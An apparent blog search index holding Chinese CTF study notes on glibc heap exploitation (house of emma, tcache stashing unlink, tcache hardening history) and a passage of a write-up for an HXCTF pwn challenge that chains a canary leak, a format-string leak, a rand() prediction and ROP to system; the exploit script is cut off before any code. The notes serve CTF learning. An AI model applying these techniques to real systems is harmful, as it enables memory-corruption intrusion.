<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>house of emma</title>
      <link href="/2025/10/06/heap/house%20of%20emma/"/>
      <url>/2025/10/06/heap/house%20of%20emma/</url>
      
        <content type="html"><![CDATA[<h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看完了kiwi，现在来看看emma，这两个手法的思路大差不差。但是emma有一道湖湘杯的例题，学习起来会方便很多</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>核心同样是kiwi当中的那个断言，但是修改的思路转变了。在kiwi中是修改虚表中某个函数指针，在emma中则是修改vtable的地址。这个地址是–<code>_IO_cookie_jumps</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在emma的利用中,主要就是利用<code>_IO_cookie_read</code>,而在这个函数的开始几行,是对<code>rax</code> 加密,然后<code>call rax</code>,加密是另一个操作数是<code>fs:[0x30]</code>,这个指针可以利用<code>large bin attack</code> 修改.</p><p>如果题目开启沙箱禁用了<code>execve</code>,那就需要<code>setcontext</code>中的<code>gadget</code>了</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>利用<code>largebins attack</code>等手段,修改掉<code>stderr</code>,然后伪造<code>fake io</code></li><li>利用<code>setcontext+61</code>控制程序的执行流.</li><li>如果程序没有开启沙箱的话,可以考虑用<code>system</code>来<code>get shell</code></li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>[[湖湘杯-2021-house of emma]]</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> House of XXX </tag>
            
            <tag> IO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache_stashing_attack</title>
      <link href="/2025/10/06/heap/tcache_stashing_attack/"/>
      <url>/2025/10/06/heap/tcache_stashing_attack/</url>
      
        <content type="html"><![CDATA[<h1 id="tcache-stashing-attack"><a href="#tcache-stashing-attack" class="headerlink" title="tcache_stashing_attack"></a>tcache_stashing_attack</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>虽说已经准备考公了，但是自己还是喜欢打pwn ， 感觉还是不能放弃。<br>那就继续前进</p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">    &amp;&amp; (tc_victim = last (bin) ) != bin) <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span> (tc_victim != <span class="number">0</span>) <span class="comment">//成功获取了chunk</span></span><br><span class="line"> &#123;</span><br><span class="line">     bck = tc_victim-&gt;bk; <span class="comment">//在这里bck是fake chunk的bk</span></span><br><span class="line">     <span class="comment">//设置标志位</span></span><br><span class="line">     set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">     <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">         set_non_main_arena (tc_victim);</span><br><span class="line"> </span><br><span class="line">     bin-&gt;bk = bck;</span><br><span class="line">     bck-&gt;fd = bin; <span class="comment">//关键处</span></span><br><span class="line"> </span><br><span class="line">     tcache_put (tc_victim, tc_idx); <span class="comment">//将其放入到tcache中</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是先看源码吧,这个触发条件就是,tcache bins 里有堆块,但是 没有从tachce 申请, 那么就会触发这段代码.</p><p>触发之后,它会把当前<code>smallbin</code>中的堆块全都放进<code>tcache bins</code>,同时还不会检查 bk.</p><p>那么如果我修改<code>small bin</code> 中最后的堆块的<code>bk</code> 为一个 <code>fake chunk</code>, 并且将<code>fake chunk</code> 的 <code>bk</code> 指针修改为 <code>target - 0x10</code>, 那么经过上面的代码,就会在<code>target</code>处写入这个 <code>small bin</code>的地址.</p><p>而且之后,<code>fake chunk</code> 会进入到<code>tcache bin</code> ,可以直接申请出来.</p><p>通过这个方法,可以做两件事情,一是往一个地址里写入<code>small bins</code> 的地址,一个是可以申请一块<code>fake chunk</code> </p><p>在unsorted 失效之后,这个方法,使用的更为广泛.</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>介绍完了,原理之后,我们来看具体的一个利用流程.具体该如何操作呢?</p><ol><li><p>先把<code>tcache bins</code> 填充 到有5个堆块, 然后相应大小的<code>small bin</code>中有2个堆块.</p><blockquote><p><code>tcache bin</code>的填充,不多说.<code>small bin</code>,可以通过切割<code>unsorted bin</code> 控制里面的大小,然后再申请大堆块,迫使其放入<code>tcache bin</code></p></blockquote></li><li><p>假设small bin中的结构如下:</p><blockquote><p>chunk A: fd&#x3D;main_arena+88 , bk&#x3D;B<br>chunk B: fd&#x3D;A,bk&#x3D;main_arena+88<br>那么,接下来如果使用calloc 申请 ,会先申请出A堆块,然后对B做上述处理.</p></blockquote></li><li><p>那么,我们提前修改,B中的bk为fake chunk 的地址,同时确保,这个fd可写.</p><blockquote><p>chunk B: fd&#x3D;A,bk&#x3D;fake chunk<br>fake chunk:fd&#x3D;随便 bk&#x3D;target-0x10<br>这个target 要可写</p></blockquote></li><li><p>那么,在之后calloc ,会对这两个堆块都走上述代码.</p><blockquote><p>申请时,A被申请出去,此时smallbin fd 链只有 B,bk 链里有fake chunk 和它的bk.<br>因为代码里是取last(),也就是从bk 链里取,所以先出理b.那么就有 fake chunk-&gt;fd&#x3D;B<br>然后处理fake chunk, 所以有target&#x3D;fake chunk</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> tcache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache的发展历程</title>
      <link href="/2025/10/06/heap/tcache%E7%9A%84%E5%8F%91%E5%B1%95%E5%8E%86%E7%A8%8B/"/>
      <url>/2025/10/06/heap/tcache%E7%9A%84%E5%8F%91%E5%B1%95%E5%8E%86%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="tcache的发展历程"><a href="#tcache的发展历程" class="headerlink" title="tcache的发展历程"></a>tcache的发展历程</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经建议，笔者打算参加一次xctf 的分站赛，为此开始备注。遂开始复现往届比赛赛题。先从这次sekaictf-2025开始。这是从第一题开始的分析与延伸。</p><h2 id="tcache的引入及更新"><a href="#tcache的引入及更新" class="headerlink" title="tcache的引入及更新"></a>tcache的引入及更新</h2><h3 id="2-26-2-27"><a href="#2-26-2-27" class="headerlink" title="2.26-2.27"></a>2.26-2.27</h3><p>首先，tcache 在glibc 2.26 版本登场，其目的是为了加快堆块的管理。因此在没有作安全的检测，也为之后的利用埋下了隐患。</p><h4 id="相关源码"><a href="#相关源码" class="headerlink" title="相关源码"></a>相关源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>          counts[TCACHE_MAX_BINS];   <span class="comment">/* 0x00 */</span></span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];  <span class="comment">/* 0x40 */</span></span><br><span class="line">&#125; tcache_perthread_struct;                   <span class="comment">/* 总长 0x290 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>   <span class="comment">/* 仅 8 字节 */</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>在glibc2.26 和 glibc2.27 的版本中，没有任何安全检测的手段。可以修改tcache chunk(指链入tache bins 中的堆块) 的next 字段，完成任意地址分配。</p><p>当然，为了便于tcache 的管理，加入了<code>tcache_perthread_struct</code> 结构体.<br><code>counts</code> 数组,用来记录每个大小的<code>tcache bins</code> 中的数量<br><code>entries</code>数组用来记录每个<code>tcache chunk</code>的<code>next</code>字段的地址<br>同理,我们可以修改<code>counts</code> 和<code>entries</code>来欺骗系统,完成任意地址分配.</p><p>因为没有任何检测,所以我们可以完成<code>double free</code>,甚至你可以把同一个堆块连续free 7次,把tcache bins 填满.</p><h3 id="2-28-第一次补丁"><a href="#2-28-第一次补丁" class="headerlink" title="2.28 第一次补丁"></a>2.28 第一次补丁</h3><p>显然,注意到了<code>double free</code>的利用过于easy, 于是<code>tcache</code> 迎来了他的第一次更新, 添加了 key 这个变量. 在2.29 版本没有什么改动</p><h4 id="相关源码-1"><a href="#相关源码-1" class="headerlink" title="相关源码"></a>相关源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>   <span class="comment">/* ← 指向 tcache 本身 */</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(tcache_perthread_struct *tcache, tcache_entry *e, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 1. 先检查链表长度 */</span></span><br><span class="line">    <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &gt;= TCACHE_MAX_BINS)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 2. 关键：double-free 检测 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 3. 把 chunk 插入链表头 */</span></span><br><span class="line">    e-&gt;key = tcache;                  <span class="comment">// 标记“我已进 tcache”</span></span><br><span class="line">    e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">    tcache-&gt;counts[tc_idx]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单解析一下:</p><ol><li>key字段开始不作设置</li><li>当堆块通过 <code>double-free</code>时,也就是<code>e-&gt;key!=tcache</code>时,<code>e</code>进入<code>tcache bins</code>中,并把<code>key</code>设置为<code>tcahche</code></li><li>那么下次<code>free(e)</code>,就会检测到这个的key,从而判断是否<code>double-free</code>.</li></ol><p>但是,想要绕过也非常简单.想要继续<code>double free</code>,只要能修改到key字段就可以继续这个利用.<br>而修改next的方法可以照旧.</p><p>这个检测,仅仅是为了针对<code>double free</code>而已,所以局限很大.对安全方面的加强有点,但多.</p><h3 id="2-30微调-counts加宽"><a href="#2-30微调-counts加宽" class="headerlink" title="2.30微调-counts加宽"></a>2.30微调-counts加宽</h3><p>没有大改,也不知道为啥要这么改动.效果不知道,目的不知道. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span>          counts[TCACHE_MAX_BINS];   <span class="comment">/* 0x00 */</span></span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];  <span class="comment">/* 0x80 */</span></span><br><span class="line">&#125; tcache_perthread_struct;   </span><br></pre></td></tr></table></figure><p>在2.26 和 2.27 中, 这个字段是char 类型,也就是只有8位, 1字节.   现在加宽, 改为16位, 2字节.<br>以后修改 entries 数组时,需要把偏移调整一下.</p><h3 id="2-32小加强-entries加密"><a href="#2-32小加强-entries加密" class="headerlink" title="2.32小加强-entries加密"></a>2.32小加强-entries加密</h3><p>entries的加密,让之前直接修改next 的利用变得稍微困难了一点. 我们必须明确一个点,tcache bins 中, chunk 的 下一个堆块 原本是有next 决定的,因为entries 就是 直接 用next的值.<br>但是现在不是了, entries 是 (&amp;next&gt;&gt;12) ^ next . 但是因为加密的算法是固定的,所以 我们只要能泄露堆地址,就可以继续伪造.</p><h4 id="相关源码-2"><a href="#相关源码-2" class="headerlink" title="相关源码"></a>相关源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">        ((__typeof (ptr)) (((size_t) pos &gt;&gt; 12) ^ (size_t) (ptr)))</span></span><br></pre></td></tr></table></figure><p>假设 你要写入的 地址是 target , 你现在修改的chunk 的 next 指针的地址是addr. 那么你实际需要写入next 的值是 (addr&gt;&gt;12) ^ target. </p><p>计算同样非常简单.</p><h3 id="2-34小加强-key随机化"><a href="#2-34小加强-key随机化" class="headerlink" title="2.34小加强-key随机化"></a>2.34小加强-key随机化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> __thread <span class="type">size_t</span> tcache_key = <span class="number">0</span>;   <span class="comment">/* ← 不再是 tcache 地址，而是随机值 */</span></span><br></pre></td></tr></table></figure><p>虽然是小加强, 因为此时要获取key似乎只能爆破.但是我不明白,因为对key字段的检测,只有在这个堆块被free 要进入tcache bins 时.</p><p>也就是说,其实很多时候根本触发不了这个检测.</p><h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://bbs.kanxue.com/thread-275302.htm#msg_header_h2_4">[原创]tcache bin利用总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> tcache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HXCTF-2025-决赛彩蛋</title>
      <link href="/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/HXCTF%E5%86%B3%E8%B5%9B/bo0k_store/"/>
      <url>/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/HXCTF%E5%86%B3%E8%B5%9B/bo0k_store/</url>
      
        <content type="html"><![CDATA[<h1 id="bo0k-store"><a href="#bo0k-store" class="headerlink" title="bo0k_store"></a>bo0k_store</h1><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><p><strong>先用checksec 看了一下保护机制–全开</strong></p><h3 id="mian函数"><a href="#mian函数" class="headerlink" title="mian函数"></a>mian函数</h3><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525114939255.png" alt="image-20250525114939255"><br>1.可以看到，会循环调用menu，进行选择进入不同的book_store.<br>2.当v3&#x3D;1668508013时，是另一题的彩蛋，不用管他。<br>3.按照1 2 3 的顺序依次查看各个选项的内容。</p><h3 id="选项1–b0ok-store"><a href="#选项1–b0ok-store" class="headerlink" title="选项1–b0ok_store"></a>选项1–b0ok_store</h3><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115233521.png" alt="image-20250525115233521"><br>1.两次输入0x19字节。为什么呢？熟悉的同学可能会想到，第一次覆盖canary高字节，然后再改回去。所以这个地方是留个我们泄露canary的。应该是的<br>2.同时注意到这个b0ok_times,它的初始值为1，所以只有一次机会利用这个选项。</p><h3 id="选项2–b00k-store"><a href="#选项2–b00k-store" class="headerlink" title="选项2–b00k_store"></a>选项2–b00k_store</h3><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115622638.png" alt="image-20250525115622638"><br>1.熟悉的格式化字符串漏洞，8字节的大小还是太长了，可以泄露很多东西。<br>2.具体怎么使用还是需要动调看栈上有什么数据可以泄露。<br>3.这题目是开启了所有保护机制，所以极有可能是用来泄露pie 和 stack 的。</p><h3 id="选项3–bo0k-store"><a href="#选项3–bo0k-store" class="headerlink" title="选项3–bo0k_store"></a>选项3–bo0k_store</h3><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525120159544.png" alt="image-20250525120159544"><br>1.本题的核心重点，来了。首先可以看到这里的read。老朋友了，0x50的读入，有0x28的空间留给我们去rop，应该是利用这里泄露libc再返回执行system。<br>2.但是这里有一个随机数，我们需要正确的输入随机数，才能顺利的继续执行。那么我们要如何绕过这个可恶的随机数呢？</p><h2 id="rand-伪随机数"><a href="#rand-伪随机数" class="headerlink" title="rand 伪随机数"></a>rand 伪随机数</h2><h3 id="方法1–ctypes"><a href="#方法1–ctypes" class="headerlink" title="方法1–ctypes"></a>方法1–ctypes</h3><p><a href="https://blog.csdn.net/weixin_39194641/article/details/103089862">CTF中的PWN——srand()&#x2F;rand()漏洞（栈溢出）_ctf rand-CSDN博客</a><br><a href="https://n0we11.github.io/2023/10/16/PWN%E4%B8%AD%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/">随机数利用</a></p><p>1.在这两篇博客当中说的很简单，就是rand()是基于时间戳生成的随机数，所以只要我们用同样的函数，同样的参数，同样的时间，就能得到同样的随机数。<br>2.所以我们使用ctypes库，调用c的链接库和函数得出应该结果，再把结果输入给本题的程序就行。<br>3.这种方法，比较看运行的速度? 如果有延迟导致的不同时间，就要尝试几次。</p><h3 id="方法2–奇技淫巧"><a href="#方法2–奇技淫巧" class="headerlink" title="方法2–奇技淫巧"></a>方法2–奇技淫巧</h3><p><a href="https://heshi906.github.io/2023/09/23/%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3%EF%BC%88%E7%A0%B4%E8%A7%A3%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%89/index.html">奇思妙想（破解随机数） | 未来大pwn子的blog</a><br>1.这篇博客的方法甚得我心。就是我直接自己也写一个程序，生成10s后的随机数，然后拿这个结果，去输入。后续重复运行题目程序，去撞这个时间。<br>2.在我的解法中就是利用了这个，与方法1比，这个比较吃手法，因为按的太快，就卡不上10s。按得太慢也卡不上10s 。但是实际操作感觉容错还是挺高的，基本上我每一次都能通，而且远程也没问题。</p><h2 id="gdb-分析"><a href="#gdb-分析" class="headerlink" title="gdb 分析"></a>gdb 分析</h2><h3 id="找偏移和泄露"><a href="#找偏移和泄露" class="headerlink" title="找偏移和泄露"></a>找偏移和泄露</h3><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122212160.png" alt="image-20250525122212160"><br>1.选项1是刚好覆盖到canary，没什么好说的，经典手法了。</p><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122423039.png" alt="image-20250525122423039"><br>1.这里可以泄露栈基址和pie。如果有其他条件配合的话，还可以有更美妙的利用</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>1.首先在选项1中泄露canary，再从选项2中拿到pie和stack。这样就可以在选项3中，泄露libc。然后把返回地址设置成通过随机数检验的read的地址，直接读入，就不用第二次输入随机数了。<br>2.所以，第一次在选项3中的输入需要注意rbp的值不能随意覆盖，必须得是合法的地址。拿到pie之后我们可以把rbp写成bss段上的地址。这样下一次的输入，就会在bss段上。最后leave ret时，会跳转过来继续执行。当然也可以写stack上的某个地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 